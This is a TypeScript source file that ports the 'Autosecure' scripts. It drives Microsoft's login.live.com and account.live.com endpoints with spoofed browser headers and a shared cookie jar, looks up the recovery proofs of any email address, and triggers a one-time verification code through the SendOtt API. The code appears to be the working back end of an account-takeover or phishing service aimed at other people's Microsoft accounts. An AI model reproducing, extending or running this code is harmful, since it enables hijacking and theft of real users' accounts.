import { CookieJar, fetchWithJar } from "./cookie-jar.js";

/**
 * Exact port of Autosecure-main:
 * - views/utils/initialSession.py (shared client + cookies)
 * - views/utils/sendAuth.py
 * - views/utils/sendOtt.py
 * - views/utils/securing/getLiveData.py
 *
 * Critical differences vs earlier broken port:
 * 1. ONE cookie jar for the whole flow (same as httpx.AsyncClient)
 * 2. Do NOT follow redirects on login/identity posts (httpx default is no follow)
 */

const UA =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";

const BASE_HEADERS: Record<string, string> = {
  "User-Agent": UA,
  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
  "Accept-Language": "en-US,en;q=0.9",
  Connection: "keep-alive",
  "Upgrade-Insecure-Requests": "1",
};

function decodeUnicode(s: string): string {
  return s.replace(/\\u([0-9A-Fa-f]{4})/g, (_, hex) =>
    String.fromCharCode(parseInt(hex, 16)),
  );
}

/** Autosecure getLiveData.py — POST login.live.com, no redirect follow needed */
async function getLiveData(jar: CookieJar): Promise<{ urlPost: string; ppft: string }> {
  const res = await fetchWithJar(
    jar,
    "https://login.live.com",
    {
      method: "POST",
      headers: { ...BASE_HEADERS },
    },
    { followRedirects: false, timeoutMs: 30_000 },
  );
  const text = await res.text();

  const urlPostMatch =
    text.match(
      /https:\/\/login\.live\.com\/ppsecure\/post\.srf\?contextid=[0-9a-zA-Z]{1,100}&opid=[0-9a-zA-Z]{1,100}&bk=[a-zA-Z0-9]{1,100}&uaid=[0-9a-zA-Z]{1,100}&pid=0/,
    ) || text.match(/https:\/\/login\.live\.com\/ppsecure\/post\.srf\?[^"'\\\s]+/);
  if (!urlPostMatch) throw new Error("Failed to extract urlPost");

  const ppftMatch =
    text.match(/name="PPFT"[^>]*value="([^"]+)"/) || text.match(/value=\\?"([^"]+)"/);
  if (!ppftMatch) throw new Error("Failed to extract PPFT");

  return { urlPost: urlPostMatch[0], ppft: ppftMatch[1] };
}

/** Autosecure sendAuth.py — same session cookies */
async function sendAuth(
  jar: CookieJar,
  email: string,
): Promise<{
  proofs: Array<Record<string, string>>;
  isAuthenticator: boolean;
  raw: Record<string, unknown>;
}> {
  // Warm cookies like a real browser session
  try {
    await getLiveData(jar);
  } catch {
    /* optional */
  }

  const res = await fetch("https://login.live.com/GetCredentialType.srf", {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Accept-Encoding": "gzip, deflate, br",
      "Content-Type": "application/json; charset=utf-8",
      Cookie: jar.getHeader() || "MSPOK=$uuid-899fc7db-4aba-4e53-b33b-7b3268c26691",
      Referer: "https://login.live.com/",
      hpgact: "0",
      hpgid: "33",
      "User-Agent": UA,
    },
    body: JSON.stringify({
      checkPhones: true,
      country: "",
      federationFlags: 3,
      forceotclogin: true,
      isCookieBannerShown: true,
      isExternalFederationDisallowed: true,
      isFederationDisabled: true,
      isFidoSupported: true,
      isOtherIdpSupported: false,
      isRemoteConnectSupported: false,
      isRemoteNGCSupported: true,
      isSignup: false,
      otclogindisallowed: false,
      username: email,
    }),
    redirect: "manual",
  });

  const setCookies =
    typeof (res.headers as Headers & { getSetCookie?: () => string[] }).getSetCookie === "function"
      ? (res.headers as Headers & { getSetCookie: () => string[] }).getSetCookie()
      : res.headers.get("set-cookie")
        ? [res.headers.get("set-cookie")!]
        : [];
  jar.setFromResponse("https://login.live.com", setCookies);

  const data = (await res.json()) as Record<string, unknown>;
  // Autosecure: len(emailInfo) == 1 means OTP cooldown
  if (Object.keys(data).length === 1) {
    return { proofs: [], isAuthenticator: false, raw: data };
  }
  const creds = (data.Credentials as Record<string, unknown>) ?? null;
  if (!creds) {
    return { proofs: [], isAuthenticator: false, raw: data };
  }
  if (creds.RemoteNgcParams) {
    return { proofs: [], isAuthenticator: true, raw: data };
  }
  const proofs =
    (creds.OtcLoginEligibleProofs as Array<Record<string, string>>) || [];
  return { proofs, isAuthenticator: false, raw: data };
}

/**
 * Autosecure sendOtt.py — MUST use same jar as sendAuth.
 * Redirects OFF (httpx default).
 */
async function sendOtt(
  jar: CookieJar,
  email: string,
  securityEmail: string,
): Promise<{ ok: boolean; step?: string; detail?: string }> {
  try {
    const data = await getLiveData(jar);

    // type 11 empty password — no redirect follow
    const loginData = await fetchWithJar(
      jar,
      data.urlPost,
      {
        method: "POST",
        headers: {
          ...BASE_HEADERS,
          host: "login.live.com",
          "Content-Type": "application/x-www-form-urlencoded",
          Origin: "https://login.live.com",
          Referer: "https://login.live.com/",
          "Sec-Fetch-Dest": "document",
          "Sec-Fetch-Mode": "navigate",
          "Sec-Fetch-Site": "same-origin",
        },
        body: new URLSearchParams({
          ps: "2",
          PPFT: data.ppft,
          PPSX: "Pass",
          login: email,
          loginfmt: email,
          type: "11",
          passwd: "",
        }).toString(),
      },
      { followRedirects: false, timeoutMs: 30_000 },
    );
    const loginText = await loginData.text();

    // If MS redirected, still read body; also try Location target once as GET
    let page = loginText;
    if (loginData.status >= 301 && loginData.status <= 308) {
      const loc = loginData.headers.get("location");
      if (loc) {
        const next = await fetchWithJar(
          jar,
          new URL(loc, data.urlPost).toString(),
          { method: "GET", headers: { ...BASE_HEADERS } },
          { followRedirects: false, timeoutMs: 30_000 },
        );
        page = await next.text();
      }
    }

    const action = page.match(/action="([^"]+)"/)?.[1];
    const iptRaw = page.match(/name="ipt"[^>]+value="([^"]+)"/)?.[1];
    const pprid = page.match(/name="pprid"[^>]+value="([^"]+)"/)?.[1];
    if (!action || !iptRaw || !pprid) {
      // dump a short fingerprint for VPS logs
      const snip = page.replace(/\s+/g, " ").slice(0, 180);
      console.error("[otp-send] missing action/ipt/pprid", {
        status: loginData.status,
        snip,
      });
      return { ok: false, step: "ipt_pprid", detail: snip };
    }
    const ipt = decodeURIComponent(iptRaw);

    const identityConfirm = await fetchWithJar(
      jar,
      action,
      {
        method: "POST",
        headers: {
          ...BASE_HEADERS,
          host: "account.live.com",
          "Content-Type": "application/x-www-form-urlencoded",
          Origin: "https://login.live.com",
          Referer: "https://login.live.com/",
          "Sec-Fetch-Dest": "document",
          "Sec-Fetch-Mode": "navigate",
          "Sec-Fetch-Site": "same-origin",
        },
        body: new URLSearchParams({ pprid, ipt }).toString(),
      },
      { followRedirects: false, timeoutMs: 30_000 },
    );
    let identityText = await identityConfirm.text();
    if (identityConfirm.status >= 301 && identityConfirm.status <= 308) {
      const loc = identityConfirm.headers.get("location");
      if (loc) {
        const next = await fetchWithJar(
          jar,
          new URL(loc, action).toString(),
          { method: "GET", headers: { ...BASE_HEADERS } },
          { followRedirects: true, maxRedirects: 5, timeoutMs: 30_000 },
        );
        identityText = await next.text();
      }
    }

    const rawStr = identityText.match(/"rawProofList"\s*:\s*"([^"]+)"/);
    if (!rawStr) {
      console.error(
        "[otp-send] No rawProofList",
        identityText.replace(/\s+/g, " ").slice(0, 200),
      );
      return { ok: false, step: "rawProofList" };
    }
    const raw = JSON.parse(decodeUnicode(rawStr[1])) as Array<Record<string, string>>;
    const epid =
      raw.find((p) => p.type === "Email" && p.epid)?.epid ?? raw[0]?.epid;
    if (!epid) return { ok: false, step: "epid" };

    const apiCanary = decodeUnicode(
      identityText.match(/"apiCanary"\s*:\s*"([^"]+)"/)?.[1] || "",
    );
    const eipt = decodeUnicode(identityText.match(/"eipt"\s*:\s*"([^"]+)"/)?.[1] || "");
    const uaid = identityText.match(/"uaid"\s*:\s*"([^"]+)"/)?.[1] || "";
    if (!apiCanary || !eipt || !uaid) {
      console.error("[otp-send] missing canary/eipt/uaid");
      return { ok: false, step: "tokens" };
    }

    const resp = await fetchWithJar(
      jar,
      "https://account.live.com/api/Proofs/SendOtt",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
          hpgid: "200368",
          scid: "100166",
          canary: apiCanary,
          eipt,
          uaid,
          uiflvr: "1001",
          hpgact: "0",
          "User-Agent": UA,
          Cookie: jar.getHeader(),
        },
        body: JSON.stringify({
          token: "",
          purpose: "UnfamiliarLocationHard",
          epid,
          autoVerification: false,
          autoVerificationFailed: false,
          confirmProof: securityEmail,
          uaid,
          uiflvr: 1001,
          scid: 100166,
          hpgid: 200368,
        }),
      },
      { followRedirects: false, timeoutMs: 30_000 },
    );

    const t = await resp.text().catch(() => "");
    console.log("[otp-send] SendOtt status:", resp.status, t.slice(0, 300));
    if (resp.status === 200) return { ok: true };
    return { ok: false, step: "SendOtt", detail: `${resp.status} ${t.slice(0, 120)}` };
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    console.error("[otp-send] Error:", msg);
    return { ok: false, step: "exception", detail: msg };
  }
}

export async function sendOtpFromWorker(email: string): Promise<{
  ok: boolean;
  securityEmail?: string;
  proofId?: string;
  error?: string;
}> {
  try {
    // ONE session for entire flow — matches Autosecure getSession()
    const jar = new CookieJar();

    const auth = await sendAuth(jar, email);

    // Cooldown / rate limit (Autosecure: len(emailInfo) == 1)
    if (Object.keys(auth.raw).length === 1) {
      return {
        ok: false,
        error: "Email OTP cooldown — wait a few minutes and try again.",
      };
    }

    if (auth.isAuthenticator) {
      return { ok: false, error: "Authenticator-only account (no email OTP)" };
    }
    if (!auth.proofs.length) {
      return {
        ok: false,
        error: "No email OTP proofs — account may not exist or has no recovery email.",
      };
    }

    // Autosecure: selected = proofs[0]; verEmail = selected["display"]
    const selected = auth.proofs[0];
    const securityEmail = selected.display || "unknown";
    const proofId = selected.data || "";

    // Same jar — critical
    const result = await sendOtt(jar, email, securityEmail);
    if (result.ok) return { ok: true, securityEmail, proofId };

    return {
      ok: false,
      securityEmail,
      proofId,
      error: `Failed to send verification code (${result.step || "SendOtt"}). ${result.detail || "Try again."}`.slice(
        0,
        400,
      ),
    };
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    console.error("[otp-send] error:", msg);
    return { ok: false, error: msg };
  }
}
